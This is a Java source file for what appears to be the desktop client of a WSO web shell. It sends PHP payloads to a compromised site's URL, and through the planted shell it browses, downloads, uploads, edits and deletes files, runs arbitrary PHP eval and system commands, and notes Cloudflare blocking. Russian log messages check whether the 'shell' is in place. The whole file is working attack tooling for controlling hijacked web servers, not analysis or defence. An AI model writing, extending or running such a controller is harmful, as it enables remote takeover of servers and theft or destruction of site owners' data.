package base;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.CRC32;
import javax.swing.ImageIcon;
import javax.swing.table.DefaultTableModel;
import org.apache.commons.codec.binary.Base64;
import struct.*;
import lib.*;

public class WSO {

    public PHPInfo info = new PHPInfo();
    public ArrayList<OneFile> folders = new ArrayList();
    public ArrayList<OneFile> files = new ArrayList();
    public String otvet;
    public boolean cloudflare = false;


    public String exec_code(String code, String params) throws Exception {
        return this.exec_vader(code, params);
    }

    public String exec_vader(String code, String params) {
        String url = WebWSO.url;

        miniBrowser mbr = new miniBrowser();
        ApacheBrowser br = new ApacheBrowser();
        String dat0 = br.get(url);
        url = br.get_last_url;

        Pattern p = Pattern.compile("https?://(.*?)/");
        Matcher m = p.matcher(url + "/");
        if (!m.find()) {
            return "";
        }

        HashMap<String, String> post_map = new HashMap();
        post_map = Helper.parse_query_string(params);

        String post_code = "";
        if (!post_map.isEmpty()) {
            post_code = Helper.generate_post_code(post_map);
        }

        String full_code = post_code + code;

        WSOQuery query = JPython.get_query(Config.pyFile, url, full_code);
        if (query.hasCookie()) {
            br.cookie = query.cookieAsString();
        }

        if (query.hasPost()) {
            otvet = br.post(query.url, query.post);
        } else {
            otvet = br.get(query.url);
        }

        if ((otvet.indexOf("Attention Required!") >= 0) && (otvet.indexOf("Cloudflare") >= 0)) {
            this.cloudflare = true;
        }

        return otvet;
    }

    public boolean start() throws Exception {
        try {
            String code = Helper.readFile("core/start.php");
            code = Helper.replace(code, "<?php", "");
            code = Helper.replace(code, "?>", "");
            String otvet = this.exec_code(code, "");
            String decoded = new String(Base64.decodeBase64(otvet), "UTF8");
            JsonParser parser = new JsonParser();
            JsonObject json = (JsonObject) parser.parse(decoded).getAsJsonObject();
            String cwd = json.get("cwd").getAsString();
            cwd = cwd.replace('\\', '/');

            JsonObject jInfo = json.get("info").getAsJsonObject();
            info.version = jInfo.get("version").getAsString();
            info.os = jInfo.get("os").getAsString();
            info.free = jInfo.get("free").getAsLong() / (1024 * 1024);

            Base.wso_frame.server_info.setText(info.toString());

            JsonArray files = (JsonArray) json.get("files").getAsJsonArray();
            JsonArray folders = (JsonArray) json.get("folders").getAsJsonArray();
            this.folders.clear();
            this.files.clear();
            for (int i = 0; i < folders.size(); i++) {
                JsonObject obj = folders.get(i).getAsJsonObject();
                OneFile one = new OneFile();
                one.is_directory = true;
                one.is_readable = obj.get("is_readable").getAsBoolean();
                one.is_writeable = obj.get("is_writeable").getAsBoolean();
                one.modified = obj.get("modified").getAsString();
                one.name = obj.get("filename").getAsString();
                one.permissions = obj.get("perms").getAsString();
                this.folders.add(one);
            }

            for (int i = 0; i < files.size(); i++) {
                JsonObject obj = files.get(i).getAsJsonObject();
                OneFile one = new OneFile();
                one.is_directory = false;
                one.is_readable = obj.get("is_readable").getAsBoolean();
                one.is_writeable = obj.get("is_writeable").getAsBoolean();
                one.modified = obj.get("modified").getAsString();
                one.name = obj.get("filename").getAsString();
                one.permissions = obj.get("perms").getAsString();
                try {
                    one.size = obj.get("size").getAsInt();
                } catch (Exception ex) {
                    one.size = 0;
                }
                this.files.add(one);
            }

            Base.wso_frame.folder_field.setText(cwd);
            Base.resetFiles();
            DefaultTableModel tm = (DefaultTableModel) Base.wso_frame.file_manager.getModel();
            for (int i = 0; i < this.folders.size(); i++) {
                OneFile folder = this.folders.get(i);
                String perms = "[" + folder.permissions + "]";
                if ((!folder.is_readable) && (!folder.is_writeable)) {
                    perms = "not readable/writeable " + perms;
                }

                if ((!folder.is_readable)) {
                    perms = "not readable " + perms;
                }

                if ((!folder.is_writeable)) {
                    perms = "not writeable " + perms;
                }
                tm.addRow(new Object[]{new ImageIcon("images/folder.png"), folder.name, "", perms, folder.modified});
            }
            for (int i = 0; i < this.files.size(); i++) {
                OneFile file = this.files.get(i);
                String perms = "[" + file.permissions + "]";
                if ((!file.is_readable) && (!file.is_writeable)) {
                    perms = "not readable/writeable " + perms;
                }

                if ((!file.is_readable)) {
                    perms = "not readable " + perms;
                }

                if ((!file.is_writeable)) {
                    perms = "not writeable " + perms;
                }

                String size = (file.size / 1024) + " kb";
                if (file.size / 1024 == 0) {
                    size = (file.size) + " b";
                }
                tm.addRow(new Object[]{new ImageIcon("images/file.png"), file.name, size, perms, file.modified});
            }
            Helper.log("Минишелл обнаружен!");
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            Helper.log("Ошибка! Шелл на месте?");
            return false;
        }
    }

    public void chdir(String dir) throws Exception {
        String code = Helper.readFile("core/chdir.php");
        code = Helper.replace(code, "<?php", "");
        code = Helper.replace(code, "?>", "");
        String d_pth1 = Base.wso_frame.folder_field.getText();
        String d_pth2 = dir;
        String params = "d_pth1=" + new String(Base64.encodeBase64(d_pth1.getBytes()), "UTF8");
        params += "&d_pth2=" + new String(Base64.encodeBase64(d_pth2.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");

        String otvet = this.exec_code(code, params).trim();
        String decoded = new String(Base64.decodeBase64(otvet), "UTF8");
        JsonParser parser = new JsonParser();
        JsonObject json = (JsonObject) parser.parse(decoded).getAsJsonObject();
        String cwd = json.get("cwd").getAsString();
        cwd = cwd.replace('\\', '/');
        JsonArray files = (JsonArray) json.get("files").getAsJsonArray();
        JsonArray folders = (JsonArray) json.get("folders").getAsJsonArray();
        this.folders.clear();
        this.files.clear();
        for (int i = 0; i < folders.size(); i++) {
            JsonObject obj = folders.get(i).getAsJsonObject();
            OneFile one = new OneFile();
            one.is_directory = true;
            one.is_readable = obj.get("is_readable").getAsBoolean();
            one.is_writeable = obj.get("is_writeable").getAsBoolean();
            one.modified = obj.get("modified").getAsString();
            try {
                one.name = obj.get("filename").getAsString();
            } catch (Exception e0) {
                continue;
            }
            one.permissions = obj.get("perms").getAsString();
            this.folders.add(one);
        }

        for (int i = 0; i < files.size(); i++) {
            JsonObject obj = files.get(i).getAsJsonObject();
            OneFile one = new OneFile();
            one.is_directory = false;
            one.is_readable = obj.get("is_readable").getAsBoolean();
            one.is_writeable = obj.get("is_writeable").getAsBoolean();
            one.modified = obj.get("modified").getAsString();
            try {
                one.name = obj.get("filename").getAsString();
            } catch (Exception e0) {
                continue;
            }
            one.permissions = obj.get("perms").getAsString();
            one.size = obj.get("size").getAsInt();
            this.files.add(one);
        }

        Base.wso_frame.folder_field.setText(cwd);
        Base.resetFiles();
        DefaultTableModel tm = (DefaultTableModel) Base.wso_frame.file_manager.getModel();
        for (int i = 0; i < this.folders.size(); i++) {
            OneFile folder = this.folders.get(i);
            String perms = "[" + folder.permissions + "]";
            if ((!folder.is_readable) && (!folder.is_writeable)) {
                perms = "not readable/writeable " + perms;
            }

            if ((!folder.is_readable)) {
                perms = "not readable " + perms;
            }

            if ((!folder.is_writeable)) {
                perms = "not writeable " + perms;
            }
            tm.addRow(new Object[]{new ImageIcon("images/folder.png"), folder.name, "", perms, folder.modified});
        }
        for (int i = 0; i < this.files.size(); i++) {
            OneFile file = this.files.get(i);
            String perms = "[" + file.permissions + "]";
            if ((!file.is_readable) && (!file.is_writeable)) {
                perms = "not readable/writeable " + perms;
            }

            if ((!file.is_readable)) {
                perms = "not readable " + perms;
            }

            if ((!file.is_writeable)) {
                perms = "not writeable " + perms;
            }

            String size = (file.size / 1024) + " kb";
            if (file.size / 1024 == 0) {
                size = (file.size) + " b";
            }

            tm.addRow(new Object[]{new ImageIcon("images/file.png"), file.name, size, perms, file.modified});
        }
    }

    public void view(String file) throws Exception {
        String code = Helper.readFile("core/view.php");
        code = Helper.replace(code, "<?php", "");
        code = Helper.replace(code, "?>", "");
        String d_pth = Base.wso_frame.folder_field.getText();
        String d_file = file;
        String params = "d_pth=" + new String(Base64.encodeBase64(d_pth.getBytes()), "UTF8");
        params += "&d_file=" + new String(Base64.encodeBase64(file.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");

        String otvet = this.exec_code(code, params).trim();
        String decoded = new String(Base64.decodeBase64(otvet), "UTF8");
        Helper.strToFile("temp/view/" + file, decoded);
        String cmd = Config.notepad + " " + "temp/view/" + file;
        Process myProcess = Runtime.getRuntime().exec(cmd);
    }

    public void download(String file) throws Exception {
        String code = Helper.readFile("core/download.php");
        code = Helper.replace(code, "<?php", "");
        code = Helper.replace(code, "?>", "");
        String d_pth = Base.wso_frame.folder_field.getText();
        String d_file = file;
        String params = "d_pth=" + new String(Base64.encodeBase64(d_pth.getBytes()), "UTF8");
        params += "&d_file=" + new String(Base64.encodeBase64(d_file.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");

        String otvet = this.exec_code(code, params).trim();
        Helper.strToFile("download/" + file, otvet);
    }

    public void edit(String file) throws Exception {
        String code = Helper.readFile("core/download.php");
        code = Helper.replace(code, "<?php", "");
        code = Helper.replace(code, "?>", "");
        String d_pth = Base.wso_frame.folder_field.getText();
        String d_file = file;
        String params = "d_pth=" + new String(Base64.encodeBase64(d_pth.getBytes()), "UTF8");
        params += "&d_file=" + new String(Base64.encodeBase64(d_file.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");

        String otvet = this.exec_code(code, params).trim();
        Helper.strToFile("temp/edit/" + file, otvet);

        String cmd = Config.notepad + " " + "temp/edit/" + file;
        Process myProcess = Runtime.getRuntime().exec(cmd);
    }

    public void upload(String filepath) throws Exception {
        String code = Helper.readFile("core/upload.php");
        code = Helper.replace(code, "<?php", "");
        code = Helper.replace(code, "?>", "");
        File fl = new File(filepath);
        String d_file = fl.getName();
        String d_content = Helper.readFile(filepath);
        String d_pth = Base.wso_frame.folder_field.getText();
        String params = "d_pth=" + new String(Base64.encodeBase64(d_pth.getBytes()), "UTF8");
        params += "&d_file=" + new String(Base64.encodeBase64(d_file.getBytes()), "UTF8");
        params += "&d_content=" + new String(Base64.encodeBase64(d_content.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");

        String otvet = this.exec_code(code, params).trim();
    }

    public void delete_folder(String path) throws Exception {
        String code = Helper.readFile("core/delete_folder.php");
        code = Helper.replace(code, "<?php", "");
        code = Helper.replace(code, "?>", "");
        String d_pth1 = Base.wso_frame.folder_field.getText();
        String d_pth2 = path;
        String params = "d_pth1=" + new String(Base64.encodeBase64(d_pth1.getBytes()), "UTF8");
        params += "&d_pth2=" + new String(Base64.encodeBase64(d_pth2.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");

        String otvet = this.exec_code(code, params).trim();
    }

    public void delete_file(String path) throws Exception {
        String code = Helper.readFile("core/delete_file.php");
        code = Helper.replace(code, "<?php", "");
        code = Helper.replace(code, "?>", "");
        String d_pth = Base.wso_frame.folder_field.getText();
        String d_file = path;
        String params = "d_pth=" + new String(Base64.encodeBase64(d_pth.getBytes()), "UTF8");
        params += "&d_file=" + new String(Base64.encodeBase64(d_file.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");

        String otvet = this.exec_code(code, params).trim();
    }

    public void save() throws Exception {
        String base = Helper.readFile("core/save.php");
        base = Helper.replace(base, "<?php", "");
        base = Helper.replace(base, "?>", "");
        String d_pth = Base.wso_frame.folder_field.getText();
        String params = "d_pth=" + new String(Base64.encodeBase64(d_pth.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");
        File fl = new File("temp/edit/" + WebWSO.edit_file);
        String otvet = null;

        base = Helper.readFile("core/save_pastebin.php");
        base = Helper.replace(base, "<?php", "");
        base = Helper.replace(base, "?>", "");
        params += "&fname=" + new String(Base64.encodeBase64(WebWSO.edit_file.getBytes()), "UTF8");
        params += "&fdata=" + Helper.encodeFileToBase64Binary("temp/edit/" + WebWSO.edit_file);
        otvet = this.exec_vader(base, params);

        String decoded = otvet;
        decoded = Helper.replace(decoded, "&quot;", "\"");
        decoded = Helper.replace(decoded, "&gt;", ">");
        decoded = Helper.replace(decoded, "&lt;", "<");
        this.otvet = decoded;

    }

    public void eval(String code) throws Exception {
        String base = Helper.readFile("core/eval_base.php");
        base = Helper.replace(base, "<?php", "");
        base = Helper.replace(base, "?>", "");
        String d_pth = Base.wso_frame.folder_field.getText();
        String params = "d_pth=" + new String(Base64.encodeBase64(d_pth.getBytes()), "UTF8");
        params += "&d_content=" + new String(Base64.encodeBase64(code.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");

        String otvet = this.exec_code(base, params).trim();
        String decoded = (otvet);
        decoded = Helper.replace(decoded, "&quot;", "\"");
        decoded = Helper.replace(decoded, "&gt;", ">");
        decoded = Helper.replace(decoded, "&lt;", "<");
        this.otvet = decoded;
    }

    public void cmd(String cmd) throws Exception {
        String base = Helper.readFile("core/console.php");
        base = Helper.replace(base, "<?php", "");
        base = Helper.replace(base, "?>", "");
        String d_pth = Base.wso_frame.folder_field.getText();
        String params = "d_pth=" + new String(Base64.encodeBase64(d_pth.getBytes()), "UTF8");
        params += "&d_content=" + new String(Base64.encodeBase64(cmd.getBytes()), "UTF8");
        params = Helper.replace(params, "+", "%2b");

        String otvet = this.exec_code(base, params).trim();
        String decoded = (otvet);
        decoded = Helper.replace(decoded, "&quot;", "\"");
        decoded = Helper.replace(decoded, "&gt;", ">");
        decoded = Helper.replace(decoded, "&lt;", "<");
        this.otvet = decoded;
    }

}
